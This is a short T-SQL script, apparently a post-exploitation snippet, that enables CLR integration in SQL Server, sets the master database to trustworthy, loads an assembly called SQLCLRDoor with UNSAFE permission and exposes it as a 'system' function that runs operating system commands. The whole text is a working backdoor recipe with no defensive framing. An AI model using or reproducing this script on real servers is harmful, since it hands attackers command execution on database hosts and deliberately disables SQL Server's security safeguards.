exec sp_configure 'show advanced options', 1;reconfigure;exec sp_configure 'clr enabled', 1;reconfigure;
//Need restart sql server
alter database master set trustworthy on
CREATE ASSEMBLY SQLCLRDoor FROM 'C:\Visual Studio 2008\Projects\SQLCLRDoor\SQLCLRDoor\bin\Release\SQLCLRDoor.dll' with PERMISSION_SET = UNSAFE;

CREATE FUNCTION system(@cmd nvarchar(4000)) RETURNS nvarchar(4000) AS EXTERNAL NAME SQLCLRDoor.CLR.system;

